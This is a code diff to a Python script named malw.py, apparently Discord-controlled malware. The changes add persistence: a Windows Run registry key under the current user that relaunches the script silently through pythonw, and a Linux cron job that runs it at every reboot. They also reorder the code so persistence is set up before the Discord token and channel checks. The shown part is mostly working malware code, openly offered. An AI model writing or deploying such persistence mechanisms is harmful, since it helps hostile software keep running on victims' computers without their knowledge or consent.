@@ -23,22 +23,17 @@ CURRENT_PATH = os.path.abspath(__file__).replace("malw.py","")
 
 # Discord Config
 
-TOKEN = ""
-CHANNEL_ID = ""
-if TOKEN =="":
-    raise Exception("Discord token not set! Please add the your discord token first by setting the variable <TOKEN> (string type)")
-if CHANNEL_ID=="":
-    raise Exception("Channel ID not set! Please add the your channel id first by setting the variable <CHANNEL_ID> (int type)")    
-
 def OS_Detection():
     OS = platform.system()
     
     regKeyName = "PROGRAMM"
     if OS=="Windows":
         import winreg
+        #Check if registry key is already set
         try:
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
             winreg.QueryValueEx(key, regKeyName)
+        #Registry key not set
         except FileNotFoundError:
             #Create key in registry
             #Key is the pythonw.exe executable followed by the current python file
@@ -52,14 +47,37 @@ def OS_Detection():
             winreg.SetValueEx(key, regKeyName, 0, winreg.REG_SZ, value)
             winreg.CloseKey(key)
             
-    elif OS == "Linux":
-        cron = CronTab(user = "root")
-        job = cron.new(command="python3 "+CURRENT_PATH+"malw.py")
-        job.every_reboot()
-        cron.write()
+    elif OS == "Linux": 
+        # Works on Ubuntu 22.04.2 LTS
+        # Creates a cronjob that executes this python script on boot
+        # Requires root permission
+        currentUser = os.getlogin()
+        # Can also set root as user but requires sudo privileges
+        cron = CronTab(user = currentUser)
+        
+        # Check if cronjob is already set
+        jobs = cron.find_command("")
+        command = "python3 "+CURRENT_PATH+"malw.py"
+        # Search for the command in the cronjobs
+        set = False
+        for job in jobs:
+            if command in job:
+                set = True
+                break
+        if not set:
+            job = cron.new(command=command)
+            job.every_reboot()
+            cron.write()
         
 OS_Detection()
 
+
+TOKEN = ""
+CHANNEL_ID = ""
+if TOKEN =="":
+    raise Exception("Discord token not set! Please add the your discord token first by setting the variable <TOKEN> (string type)")
+if CHANNEL_ID=="":
+    raise Exception("Channel ID not set! Please add the your channel id first by setting the variable <CHANNEL_ID> (int type)")    
 
 ###############START#FACE#DETECTION################
 
